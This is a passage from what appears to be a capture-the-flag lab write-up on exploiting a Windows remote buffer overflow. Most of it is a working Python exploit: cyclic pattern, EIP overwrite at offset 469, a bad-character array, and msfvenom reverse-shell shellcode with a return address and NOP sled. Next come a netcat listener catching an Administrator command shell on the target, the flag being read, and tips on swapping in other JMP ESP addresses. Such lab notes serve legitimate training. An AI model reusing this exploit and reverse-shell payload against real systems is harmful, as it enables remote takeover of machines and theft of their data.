                    "9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8"
                    "Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A"
                    "i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al"
                    "7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6"
                    "Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq", 
                    "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(pattern)
    s.close()

def eip_control():
    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

def bad_chars():
    all_chars = bytes([
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
        0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D,
        0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25,
        0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D,
        0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35,
        0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D,
        0x3E, 0x3F, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45,
        0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
        0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55,
        0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D,
        0x5E, 0x5F, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65,
        0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D,
        0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75,
        0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D,
        0x7E, 0x7F, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85,
        0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D,
        0x8E, 0x8F, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95,
        0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D,
        0x9E, 0x9F, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5,
        0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD,
        0xAE, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5,
        0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD,
        0xBE, 0xBF, 0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5,
        0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD,
        0xCE, 0xCF, 0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5,
        0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD,
        0xDE, 0xDF, 0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5,
        0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED,
        0xEE, 0xEF, 0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5,
        0xF6, 0xF7, 0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD,
        0xFE, 0xFF
    ])

    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()
    
def exploit():
    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.163 LPORT=1337 -f 'python' -b '\x00\x09\x0a\x0b\x0c\x0d' # e.g. '\x00\x0a\x0d
	buf =  b""
	buf += b"\xb8\xe0\x58\x50\xdd\xd9\xc0\xd9\x74\x24\xf4\x5a"
	buf += b"\x33\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x22"
	buf += b"\x5c\xb2\x28\x5e\xb5\xb0\xd3\x9e\x46\xd5\x5a\x7b"
	buf += b"\x77\xd5\x39\x08\x28\xe5\x4a\x5c\xc5\x8e\x1f\x74"
	buf += b"\x5e\xe2\xb7\x7b\xd7\x49\xee\xb2\xe8\xe2\xd2\xd5"
	buf += b"\x6a\xf9\x06\x35\x52\x32\x5b\x34\x93\x2f\x96\x64"
	buf += b"\x4c\x3b\x05\x98\xf9\x71\x96\x13\xb1\x94\x9e\xc0"
	buf += b"\x02\x96\x8f\x57\x18\xc1\x0f\x56\xcd\x79\x06\x40"
	buf += b"\x12\x47\xd0\xfb\xe0\x33\xe3\x2d\x39\xbb\x48\x10"
	buf += b"\xf5\x4e\x90\x55\x32\xb1\xe7\xaf\x40\x4c\xf0\x74"
	buf += b"\x3a\x8a\x75\x6e\x9c\x59\x2d\x4a\x1c\x8d\xa8\x19"
	buf += b"\x12\x7a\xbe\x45\x37\x7d\x13\xfe\x43\xf6\x92\xd0"
	buf += b"\xc5\x4c\xb1\xf4\x8e\x17\xd8\xad\x6a\xf9\xe5\xad"
	buf += b"\xd4\xa6\x43\xa6\xf9\xb3\xf9\xe5\x95\x70\x30\x15"
	buf += b"\x66\x1f\x43\x66\x54\x80\xff\xe0\xd4\x49\x26\xf7"
	buf += b"\x1b\x60\x9e\x67\xe2\x8b\xdf\xae\x21\xdf\x8f\xd8"
	buf += b"\x80\x60\x44\x18\x2c\xb5\xcb\x48\x82\x66\xac\x38"
	buf += b"\x62\xd7\x44\x52\x6d\x08\x74\x5d\xa7\x21\x1f\xa4"
	buf += b"\x20\x44\xea\xa9\x13\x30\xe8\xb5\x56\xf8\x65\x53"
	buf += b"\x32\xea\x23\xcc\xab\x93\x69\x86\x4a\x5b\xa4\xe3"
	buf += b"\x4d\xd7\x4b\x14\x03\x10\x21\x06\xf4\xd0\x7c\x74"
	buf += b"\x53\xee\xaa\x10\x3f\x7d\x31\xe0\x36\x9e\xee\xb7"
	buf += b"\x1f\x50\xe7\x5d\xb2\xcb\x51\x43\x4f\x8d\x9a\xc7"
	buf += b"\x94\x6e\x24\xc6\x59\xca\x02\xd8\xa7\xd3\x0e\x8c"
	buf += b"\x77\x82\xd8\x7a\x3e\x7c\xab\xd4\xe8\xd3\x65\xb0"
	buf += b"\x6d\x18\xb6\xc6\x71\x75\x40\x26\xc3\x20\x15\x59"
	buf += b"\xec\xa4\x91\x22\x10\x55\x5d\xf9\x90\x65\x14\xa3"
	buf += b"\xb1\xed\xf1\x36\x80\x73\x02\xed\xc7\x8d\x81\x07"
	buf += b"\xb8\x69\x99\x62\xbd\x36\x1d\x9f\xcf\x27\xc8\x9f"
	buf += b"\x7c\x47\xd9"

	
    offset = 469
    buffer = b"A"*offset
    eip = pack('<L', 0x621014E3)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

exploit()
```

##  Exploiting and Flag 

Now we open a [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener on the same port of our `msfvenom` payload and we run it from our machine entering the given IP:
 
```bash 
└─$ chmod +x win_remotebof_exploit.py 

└─$ python win_remotebof_exploit.py 
Enter IP: 10.129.169.132
```

Check listener:

```powershell
┌──(mdn0x㉿mdn0xKali)-[~/…/Academy/BufferOverflow/windows/assessment]
└─$ nc -lvnp 1337                
listening on [any] 1337 ...

connect to [10.10.15.163] from (UNKNOWN) [10.129.62.94] 51109
Microsoft Windows [Version 10.0.19042.631]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>cd /Users/Administrator/Desktop
cd /Users/Administrator/Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 968E-4955

 Directory of C:\Users\Administrator\Desktop

04/28/2021  02:00 PM    <DIR>          .
04/28/2021  02:00 PM    <DIR>          ..
04/27/2021  03:43 AM                31 flag.txt
               1 File(s)             31 bytes
               2 Dir(s)  18,179,342,336 bytes free

C:\Users\Administrator\Desktop>type flag.txt
type flag.txt

HTB{REDACTED_FLAG}
```

**NOTE**

Craft a good `msfvenom` payload use good syntax on  `--bad-chars` and substitute in your exploit,you have to gain shell on VM first, only then try on Final Target. run `python` instead of `python3`
### Tips & Tricks

If it's not working with this  `smp` address try another , or search for `54C3` (PUSH/ESP) and find another type of address to use then substitute in the code:

![Pasted image 20251010205648.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251010205648.png)
Found these for this program:

```bash
77F0D627
77F0D67F
```
